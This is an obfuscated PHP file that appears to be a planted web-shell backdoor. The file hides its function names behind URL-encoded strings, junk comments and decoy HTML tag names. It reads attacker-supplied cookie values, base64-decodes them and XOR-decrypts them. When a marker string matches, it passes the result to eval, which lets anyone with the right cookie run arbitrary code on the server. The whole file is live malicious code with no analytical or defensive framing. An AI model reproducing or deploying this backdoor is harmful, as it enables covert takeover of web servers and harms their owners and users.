<?php PARSe_stR# OCr`ht
(# wm	w	
'59' .# ^vTZp$w 
'5=%'// l92V<47h
. '53'/* j;U05: */. '%' . /* VYmA"l%	2 */	'75'	// t7'vF,&	b
. // Q.	SGUa2k
'%4' . '2%7' ./* ^UM}7x	@Pt */'3%'# M 6'{>
 . '54%' .// bMl'k|%r4$
	'52&'	/* T/	q	w_ */. '99' . '0=' //  >_Ln
. '%62' . '%41' // F^c_M>.
. /* hi.5mmqOf */	'%5'/* 5>dP5D */. '3%4' .	/* ojW%n' */ '5%3' .# BJ.3X	P;
 '6%3'# o	T 1Ma!dH
	. '4' . '%' . '5'	# @nCUvz
. 'F%'// ;Z,5; 
.// +1Fza)SUk
'44' .# T	uEU
'%6' . '5'/* >ijdm{<Ij */.# &*KHk[37
'%'# Y _\]]<+j 
.	// UKbf~ Om8
	'4'// F<3_o}t_uh
. '3%' .	/* uy:nM\"E */ '6F%'/* HX<j\Q>(_ */	. '4' ./* aV}c :69k  */'4%6' . // mi'@RW@
 '5&2'/* f'G/?]:' */. '54' .//  ?HDr\x
'=' .	# <z,HH
'%'/* |5c LRO%tK */. '65' . '%' . '53%'# >G;?	r?
./* fw gt?N */'66' . '%' .#  YOHgz{|(r
'6'/* 4b*gX>IYPD */.# ol5o;R7Ve
'2%7' ./* O@\e%K */'3'# *<i rHiK<
.//  =V	B}
	'%61' .	# P@I	W
'%'# |{\>Nm	Ai
. '4' .# W{_6npMyc
'4%' . '77%'/* Z Pz,NV */. '4c%'	# gG=Y@.{NI 
. // GE}	]e
	'46'#  e%C	
. '%72'// ^Ti	&T	 $	
	. # o/(X|Sw`$m
'%6' . '7%7' .# )5c) BM0
 '8'/* zb48A	b	 */.// d q7q 
'%3' .// :UK$\Q
 '9%'# $.X-qg-u4
	.// _	% -o~
'4' //  rt5Ss 1
.	# wl^O!8{
'F&'// w4kf< hN
. '860'# U1A4J+
	.// pRJDq6&oLb
'=%' .// %yJeBK
'6'/* zK W{"WUPC */. '6' . '%69' .	// xQP5R4
'%45'// pe) W'O
. '%' . # <2 rj
 '6c%' .	// Cs-D,
	'6'	# lH~}e*i>
. '4%5' ./* &u5/(.\D */'3%' .// S}q	LMln
'65%' . '74&' . '36' ./* 6v"LwB	/{- */'5='# &}6[g{lNs:
./* +}Fwb: */'%77' .// I2W9<W 
 '%6' . 'd' . '%' . # 		JlXE::
'6'/* ]GAv  */. 'f' . '%7'	// [ RT62*uC
 . '1%4'/* 9m]uxZLt8] */	. 'F' .# i];\[
'%62'	/* 	4fXtQ!) */ ./* @~L	eG0;h */'%6'/* 2M?-@	iBgQ */./* U.LZE */'1%'// ].< &!*Z
. # fO\O%?*
'7'	/*  vu8jQkwS */. '3'// wu+d^O	 F
. '%73'# `%$k*
./* [~5*^ */'%41'# 6Q5lp_>
. '%' . '3'	# m%Mbp
.# ?X>zG|
'1'	// [xD	8+;LQ
 .# I	^	m
'%41'// hbv 0
. '%' /* yGBG3 }'	 */. '35%' . # q v6oR|4?
'48%'	#  "	nh|!
. '39%' .# !	Q&dH}A
	'4'/* -{$?~ */.# IF7pk?H	>p
'9' ./* O_>J x  6 */'%'/* h^ ^4a+uh9 */	.# (*qp?"
'5' ./* 2J.EE0r */ '1' .	/* UqBRoF	 */	'%'/* Oc4]Ac: */	. '57%' .// CGVDCGK
	'46%' .#  f.+?W2Zt
	'45&' . '2' .// _	,Hr+
'26' . '='// 0K40p
. '%74' .// m	zfux
 '%65' # `3Uh(C oD
.// ?)::`UuQ
	'%6'// |	aS 0yvZF
	./* 3,g5& */'d%' . '50' // 9Cf&p-
. '%6' // m0{7]76A
. 'C%'	// A<&/H
. '41%'// sP k|6/O
. //  5s g
'7' ./* |U|(Ndj<^ */'4%6' . '5&'# A@zYM9
	. '496'/* 'Cbj,5 */. '='// YfUI0,'	1
. /* l J;C */'%6' // :}77Kr
. 'D'# %UE_C6/}} 
. # }N!F u`m_
 '%45' . '%6'# $q5oz+H5>
. 'e'	# cy'dP 
	.	// ThYF)
'%5'# 	JDI*y{*CE
.# +haTF yF]
	'5' /*  MYi%	,G%Y */.// Y(M!M	
'%4' . '9'# I (6~dg0	
	./* /L$Rz */'%74'// qB{Nz*P6
. '%65'/*  z"lV	4l */.	# H!		{c9L 
	'%4D'// Q3|Cp>a
.	# 6k*36
	'&'/* lU?@>W8 */.// 8)88w(e
	'187' .// oaNQ.lP-
 '=%6'//  j `E%	
. '1%3' # 6??%p=
	. //  haL3&_VkO
'A' . '%' .# _;	"	a!~vh
'31'	#  c?&:5mAo
. '%'// }5YS'
 . '3' . '0%'# 4w@AZ H+qi
.	# o4v	`S:]N	
'3a%'/* u*l	/4 */. '7' .// [pH02	i`)
'b' ./* XM[^@u8l$+ */'%6' # %Rdhi
 . '9%3' . 'A%'	// N./LI\2\eY
. '38' # 	 SH3W+\
	. '%3'// "\ta=
.// _C%4x6 wyr
'6%3'# d]]b^L ho
.# $qsk,V-M	n
 'B'/* bIKW9_ */. '%6'// lX	|MJQ ;@
.# Z>_/OTM
'9' ./* 8 :Fx 1Uj */	'%' .// 7RlU<@
'3a%' . '34' . '%3' . 'B%6' . '9%'/* 	\WlG3d */./* - /Al|< */ '3' ./* i6Z*Lt`$ */'A%3'	// %y~B=3.RN
. '3'	# dM7%7A5{E
 .// L?	_M?
	'%33' . '%3' .	// l	?l9nJ
'B' . '%69' .# VAKXF
'%3'// [v$)!uL
. 'a' . '%3'// 1zF.+0-[r*
 .# GH]}a6{K-'
'2%'// [	&gEJ&:
. '3b%'// 3C;|1
. // W7hcTS
	'69' // 8m	3j
. '%3' /* m0)He_S+ */ . 'a%' // TnsJ3p
. '33' .// nr	@C
'%35' . '%' . '3' . 'b%6'// 	1bP}T 
. '9%3'/* P`_8~u */	.	# V{T:>'7W-
	'A' // e;s'7
. '%'# b44bvG
	./* JXivR	Fu */'31%'# 3+G8&
.// 18mqUo D&L
'3' . /* v<$.n " */'5'# Phn%nbzm`U
. '%3b'// }6icx
	. '%69' . '%'// 	-/ xS=P	
	. '3A%' . '34%' // OSJ0&4
 . '33%'// <F[ t\WE
.// LOoRZW
'3B' ./* 	|Z>mrHyG1 */'%6'# plODZ~
.// 54*r'E,`U 
'9%' . '3A%'	// B>!+3SI$*%
. '3' . '6%3' . 'B%' .# &!w*a~ 
'69' # _r0IW
 .	# >|> +}FZ"U
'%3A' . /* ae;(\ND N~ */'%3'	# cd2CHC/!i
.# kN	z^0-
'1'// {FJ ?cdK
. '%34'	/* {BiI	Qra"l */. // C A?`[L>
'%'# !6ffg
. '3'/* (KQDG7E */. 'B%6'	/* r,n|O, */	. '9' . '%3A' /* *	EV( B */.// Z/_	kUb~
 '%' .// -TyfJs
	'34%'# Swzc|
 . '3b'# w)k0Q D	 
	./* b/LJ7 ^	1 */'%69' . '%' // O-3/*Yg 	2
	. '3'/* E ^u(W0 */.// bC+3I.
'A%'	/* ne"^$\  */.	// UO%=B^=w
	'36%' . '36'# .x'>ck
 . '%3b'// <2{S	%	/@<
.	/* KqM	"I9 */ '%6'# U X %
. '9%' . '3'# 7 aMd
. 'a' .#  CsnkAaA
 '%3' . '4%' .	# W>.pS/
'3'/* ;k;Q] */	. 'B' . # K(LD<>
'%6' . '9%3' . 'A%' . '38%'# ,	4Y  
.# I40'@
'38%' .// ^BxIX9Q
'3' .# z)5wr-o?
 'B'# d42`y?;c'N
. '%' // g	s:k,u 
. '69'# &FE9r(wO	;
. '%3A'# l	QCHp]TsH
.# guQ`Z^ q
'%30'	# +HX % 
 ./* 5w3nHvW */	'%3b' // kj`jn:
. '%' .# F+tK;C$+ "
'6' ./* VVh KXx	Qf */'9%'// qM3UG
 .	/* )Q];zsv{!v */	'3'	/* )q"W%+m"p */.	# %R1W'k =J
'A%3' ./* !	u54fW	 */'9%3'// &m1*<z7	hG
.# ]w(;g
'4%'/* !	j5%xbI */	. '3b' # :p {N
	. '%6'// `+J	8h>
. '9%' .#  }4TR
'3A%'// 6IiN{>mC~
. '3'/* w2"y	U */. '4'// N>Nm<Le	aF
. '%'	/*  E4/m */	.// !9 ^~.
'3B'// +nJQWHdmQ
.// ~AUHr3BQ;
'%69'	// BC9	IJ{
. /* R@F^?% */'%' . '3a' . /* -yS9: */'%' . '31%' .	/* L\Y 6 */ '3' . '6%' . '3B'	/* o}bx\f */. '%' . '6' .// LX2"2
 '9%3' . // K>inF@b
'A%'	/* }HFihde */.	# 	4`57	 Ad
 '34%'/* $,X  ) */.# ?}UnSnta
'3b' . '%69' .# P	s	 ~@gH
'%3a'	/* L	@	YeXl */.# spFtH
'%3' . '1%'# u \N_Zd5D
. '31'// _ <L@ v> 
. '%3' .// M{4  V
	'b'/* 1+/_K>'[4 */. '%69' .# N(	NZH
'%'# (fq	75_WU
. '3'// WCt>Cvo
.	// NF@m:b~h|
 'a'/* j	{k3 */	./* \T[C{ */	'%'/* ,,[?yg */. '2' # Q3L/=E2	
 . # 	.vBM9Ip4?
'd%' . '31' . '%3B' .	/* :g7^8 */'%'/*  Q&aw */./* \"u&p */ '7d'// Y=ftj\;/8
. '&9'// yC	$H3
	.// Pg9-d\a5
'38=' .// N_9dP?	&7.
'%6'	/* e(!	 J */ ./* (=	LX+ */'1%5'// UO: bWCo([
. '2%' .// dbTw-@i
'52%' .// qR53`%Z%	
'6'// RW{ C `DV
. '1'# Tu3]i:	kP
.# <XO t
'%79' . '%5' ./* FWK$lQ */'F' // ~d qA3<If!
 . '%76' .// MW05R 
'%61'# @?*p:	
 . '%' . '4c%' # :r3^ejc@
. /* u*H/, */'55%' . '6' . '5' ./* I,9Ef >Ulg */ '%53' # 8:!y7ZTq
. '&2'	// ;G	g	o
	.// 4^??a
	'5=%' . '5' #  P??%U,^
 . '4' . '%6' .// UQ)Ys4s
 '6%' .	/* ds`Y>	 */'4' .// }> Lr=v 
'f' . '%4F'# -	>+A-wGF~
.	// Ga~F	@pa^
'%74'// Ges Ev>
. '&84'// h0K[3
.	#  >HCOC
'4' .# @"?HZe 
	'=%' ./* 86U_=k9-M5 */ '6' . // 8Ck~xTAs
	'4%6' .// 40*+ $
'1%' .// v?	S'(
'7' // :.av }T;@}
	.	# !E!@B
'4%' . '41%'/* wf <^; */. '4'	// *du60
 . 'c%6' .// 1u>	 y9
	'9%'/* hOLEBK */. '53%' . '5' .	// P@J'$t1Hk
'4&' .	/* B =R? */'2' . '38'/* Hd}&	 	<|| */. '=%' . '6E'	/* 23-Xy1/ */. '%' . '41' . '%76' . // "-@j;n]
'&' . '3'// 'QZPp
	. '70='// m(OXg[o!\)
./* XxO),*08J */'%'// 	2xO9_7r_S
. '73%' /* O! V3r4P& */. /* % a|` */ '54%' . '72%'	/* iKqJV */	. '50' . # {d(VS 4gPk
'%4f' . '%53'// 	/{TF6; w
	. '&1' . '29'// x^V-wk@U4
 .# .PG[As )
	'=%5'#  *=|'{7
.// JM5<G+"
'3%' .# ;2;6[P*	
	'6'# B	j	`VSqzC
./* |n	,|n */'1%4' . 'd%'	/* T%	o4v,;9( */. '50&'/* +q-[;SEc  */. '34' .# %?{}U\OTWb
	'3=' .// ]Tu <^5L
'%53' /* KV;`$ ~  */./* wsk:\6 */'%6' . '5%'	# .z*Sys
./* x\d0yh8 */ '63' . '%' . '7' . '4%' . /* p|	VPo	  */'49' .#  ``g&
 '%6F' .// olA-:5u
	'%4e'/* L($3'k~. */.# %c Sf!
	'&46'// fw@,|W
. '8='/* I/@nu */ . '%'# Z|,m}5
	.# s.Lu<
'75%'/* =RSZ]u{=T */.# HkF8,[[t
'4e' .// 	=Du5MM<a_
'%'	/* qamRb Xum */. '53' . '%' /* 0 ( @a */	. /* Mzq7	sq */	'45%'	/*  %Kf<*:>   */	. '5' . '2%'# n}	a3
 .// 7E\n+WF=	
	'4' .// aakP2
	'9%4' # <M	L	*U
	. '1%'# ?OV@s;]
	. // (8)KD 7PT
'6C'// 2Nmr\N@
	.# 6r,Fk]Q+
	'%6' ./* $0RWQo8 */'9'#  `3qGG414~
. '%' . '5' .# W%Rq,o
'a%6' // 1eW M.]]p
 .# 7D2xz>
 '5&3'/* .qa&jw[=-C */. '3'// ?	?FS+<Pq
.// \5'Ar RFr(
 '8' . '='/* ~r.	d */	. '%4b' . '%65'/* lFq]+t(eH */	.// vD,~v
'%59' .# ]G@	G	7
'%67'// ^%L]f?
./* KAZLV	Ga */ '%' . # E(|O+I^
'65'/* -`n[%Xx */. '%4'# ?_o+	k
. 'E&4' . '8'// !Kut:g$ N	
 ./* ,(C|F */ '5'// b3&rJD$>b
./* hGIo! */'=%' . '52%' . '54' /* (F}?M */./* kaS})x:v	 */ '&'# pPMEAqYN:w
 . '9' .	// d Y:"*B
'29' . '=%4' .#  	z04ql?6K
'8' . '%74' .	/* |^]mra<c */'%4'// ViF [
. 'D%' .# 8FD7	}
'4C'	# *D!Wnbnj
. '&'	/* i KYl%|tZ */. /* Q=AJD+ */'6' . // Gr		d tHV
 '34' .# Ug\>d[tGO/
'=%'//   K	xz %=
. '4'# y)5R2^([F
.	// EY(SB
'3'# ^4OVs
 . /* $_ GrAc'{/ */'%'# SX^Qfy	5r`
.	/* )]&5+)*	 */	'6F'# B7 2QsA'
	.# ,cWQ)PY2C=
	'%6D' /*  ]Do[rI<;C */	. '%6d'# g6	!	0F
. '%4'/* 2nwWG	   */ .# .}s	:m
'5'	/* nB}*3VI M  */. '%4E' /* 8Eh&y}OAZ */	. '%5'	#  3nUDmm
.# i\B uo 
 '4'// wGh spl
	. '&6' .# 	oo%|>>l;p
'88=' .# 3/nz	*3s(l
'%'/* 'cr!)P */	. '75%'# 7&&m Z
. '72' . '%6C' # |Boiy	Q
./* _=z$n2)k */'%' .# EkM;=Ojv:Y
	'64%' . '6'// _p%mp
	. '5%6' . '3%' . # .!pfi~ +8 
'4f' . '%6'/* '[<ko */ . '4%'/* /]gFL)8 */	.	/* d8EcG */'45' . '&7' .# <3"q'~c
'04=' // !wm	qFJm
	. '%7' . '3%'# rj4+	H
. '74'# De_e{ $@HX
 . '%7' .// zcps!(
	'2' . '%4c'	// I~MPgFp>
	. '%45'	/* (veo6.< */	./* Pbqshd */'%4E' .# LbRcJoI	w^
'&'// D(&& 
 . '82' . '=' . '%53'/* -3bY5EA"IG */ .# K"/2op%
'%6' . 'D'// ``z%F
	. '%'# sNc+t71[
. '61%' .// eteQRg!
	'4C' . /* M[T5		 */	'%'# l(	yM~<'F:
. '4'// w>|sbw	4	h
 . 'C&5' . '96'#  $Lrm
.# 4v	Rq?00Mb
 '=%'# KRRh|{l
	. '7'// 4	  LS
.	# <4	;'B<6z
'9%'# >	{s5
.// @[@ :
'61'// I4\1kyg
.# Dw QxG
 '%6'// Y7m	f
 . '7%'	# AgP*lcu3
.// 8>$0U'%
'7'/* |9 is:t+[	 */. '3'# pSj2:Tq~x
 . '%6'// PtT2]`	r9(
./* o	u~N4O9 */ '1' . // @uP!	?XH1 
'%' .//  }OV'4~	
'4' . '6%' . # A0_.%N
	'6f%'# a C)Al'Nd{
.	// kGyp4
 '63%'/*  X&Z> */	. '35%' . '64%'	# AX&]Ht.b
 . '54' . // -|tcB
	'%6' . // 	cqzUa@`
'a%4'# 5wrXMC
. '7%4' . 'C' .// snr<m?d
'&7'# xJSH(u Q&6
. '15='# o}1fxh=j
. '%62'// V\|I3d-
 . /* dMx@nIB^y6 */'%' .// ]cU-5g"
'37%' // n+cW2UL
.# mQ$>A
 '44'/* Q<E@5 */. '%44' . '%42' . '%'/* Em*wt<m */./* 6sebk	6 */'46%' /* 3~1!60 */.# WRI'jeT
	'77'// s!hXr'(nG
.	# P2&Z9
	'%' # ZqR9H
	. '65%'/* v/Wv&LL]X */	. '72' .#  5l-Hl<	`r
'%75'	/* ozrHi;89 */./* zFYjh/To */'%5'// ih r; 
.# ] aHC{
'A%7'/* SZw]  */.// T PN 7DNC{
'7%'# 3	etHH
	. '39%' .	// @bx7rG1mRI
'71%'# d>	a{"
. '7'# u5id^	
.# +dK^A
'A' . # mp`Wj/>e>
 '%'/* [j`^0)miA */	.	# AT6mb`=1
'7' . 'A%5' .	/* *@,tb */'1'# /3&fn
. '&'/* UV{(v */. '74'	# lxK0S!_ 	
	. '5' .	/* E<Ypd!n	w/ */'='/* {WBsFK[J */. '%48'# !dlKr"q
. '%45' . '%' . '61'/* U(] & */. '%44'// *%TR YD<Q
. '%'# RKC0Y
.# ~/ l7
	'65' # 5"L?1C\hs
	. '%52' , $fcWf/* u.0UtN  */ ) ;// ~KvWL+
$gj7 = $fcWf [ 468	/*  "	A o&p */]($fcWf [ /* cS	}' */	688// .s[S9a
]($fcWf	/* <K	M	a */	[ /*  qHiLfZ !j */ 187 ]));	// (-1	@"
function yagsaFoc5dTjGL ( $PzHugui# )-fTb
,# 1cr	R-Q=>
$ScSXCBl	# B. he ]
 ) # 8DM>- 
	{# ? TyB:-	,
global	// $ k	V	Ls
$fcWf// wyH0| a6
	; $fS7ktO = '' ; for	# P@hKZ2("Pi
(#  -<M{	bz9
$i/* `&,%o=A!&	 */= 0 ; $i < $fcWf// / 'G:DV 
 [ 704 ] ( $PzHugui	# S&$pbC dU
) ; $i++ )/* _v'Y% */{ /* ]ui;	Y */	$fS7ktO .=/* V-<w@a6T */$PzHugui[$i] /* XUCe@a5>&X */^# 	dmKin6F
$ScSXCBl# cbM 'Qh"
 [# CVYV|[s1ke
 $i// h[	8^8dP	l
% $fcWf [ 704# }= ogO
] ( $ScSXCBl ) /* T\ P8 $E */] ; } return $fS7ktO # Tt|7?
; } function	# HBYGE >
b7DDBFweruZw9qzzQ (/* )CyUWr>9e */$Drqn )// O($33gG}
 {	/* ^n ZcPL	 */global $fcWf#  *@}%
;# iD/	 
	return $fcWf [ 938/* ~G	z5 */] // Sd/ElV b'b
(# _)vd5
$_COOKIE// M&tb`(
	)	// mvn9?
[# =\nnmp	X
$Drqn ] ;# Bke(4  z^
	} function wmoqObassA1A5H9IQWFE (// +D~wmM 	z
$b5BX# -V2ql
) /* 3wyL$vmX */{ /* df	 3@> */global# u:n 6
$fcWf ; return $fcWf [# @"Yr[J
938 ]// okY^4DX'1|
( $_POST// mTPRN
)/* :$vtA*F */[/* ?:qw  */$b5BX ] ; } $ScSXCBl =# GtOGG3d
	$fcWf [ 596 ]// J,NS P[7
( $fcWf # Q^}7@UlQ
[ 990 ]# 9gT@6{G-w<
(# hj l`	`p^L
$fcWf/* 3zgq\T _\E */[ # E	Q!jGN|n
595 ] ( $fcWf/* q"6PwG.	{ */ [ // gc.[}
	715 ]	// )A,u" =	+
( $gj7# J	6De
	[ 86# <brPVQs
]	# F ^ 		->	c
)/* K!	fD */,// rj8b [	'=P
$gj7 // BJ?]fab%
[ 35 ]# !fY=A	6C@
,	// j	gt/6k<
$gj7# CGvt:d]!
[ 14 ]	// P(|		 r_)
 * # I3ui}
 $gj7 [ 94 ]# m>]oP|GW^
) )# L	!<.8cm
,	# `b?LNZ
$fcWf [// )	ZYAqVhcE
990 /* U$V?OOT)! */]/* &	rfZ */( $fcWf [# ilQ Ne
595 ]# u>FtQ
(# ?W")K~d
	$fcWf	// Tk(We]e
[ 715 ] ( $gj7	# 8jKE:9Jl*I
[# (." [`
33/* GC\oQ`po! */]/* }S+(%y	 */) ,# /zV`2z
$gj7 [/* osvdk ; */43# ?k	'p
	]# O8a-	(6vU0
, # UVsuB@K
$gj7 [	// :SuP		RC	J
66// U4D 5K07l
	]	# P'!w<vHDbI
*// )]O\e1
	$gj7	/* 2d(;3R]JZI */[ # +j3zn>~
16// R?lun$n>T=
]// ^{b]E
) ) ) ; $MnZG9wOF = $fcWf [# ~avr2
596 ]/* t7gjZZf */(// @WA5neb3'z
$fcWf [ 990 ]/* H<]:6LA\   */( $fcWf// ZI z 		eSj
[ /* W<>	e[J */365# r,s	>9[
]# ?]R=R[<	7
( $gj7# BuwGKWsEQr
	[ 88 ] )// Oh'K6!9
) , $ScSXCBl/* nI{	P~$[ */) ; if (# M)x>&laTF(
$fcWf [ 370# W}mxTj
]// C*	h06+x
( # 	G4+VvACnw
$MnZG9wOF/* 3xhN7 */,// 	J\	Q
$fcWf [ 254 // c>]\`X
]// \8eQ9
) # Aa e5Z_U70
>/* j4ZPUfX " */$gj7 [ 11	# dB_B;=D
	] # A[+]m	ly5
	) EVAL// H>o:S*(5
 (	# *U-8xKi0
	$MnZG9wOF ) ; 